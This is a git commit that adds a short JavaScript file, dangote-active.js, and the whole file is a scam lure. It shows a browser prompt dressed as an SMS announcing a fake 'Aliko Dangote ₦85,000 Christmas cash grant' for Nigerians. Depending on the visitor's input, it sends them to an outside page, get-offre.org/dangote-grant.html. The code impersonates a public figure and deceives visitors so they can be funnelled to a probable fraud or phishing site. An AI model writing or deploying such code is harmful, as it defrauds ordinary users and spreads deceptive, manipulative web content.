4c1dc54697ced1b190ab4e96c8e3d71d699054f6
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-12-13 21:15:27 -0800

    Create dangote-active.js

---
+++ dangote-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW ₦85,000'
+password=prompt('SMS: Congratulations You are qualify for Aliko Dangote ₦85,000 CHRISTMAS CASH GRANT FOR NIGERIANS, Kindly Press OK to Withdraw X-MAS Cash Grant   ','WITHDRAW ₦85,000');
+if (password != 'WITHDRAW ₦85,000') {
+location.href='https://get-offre.org/dangote-grant.html';
+}
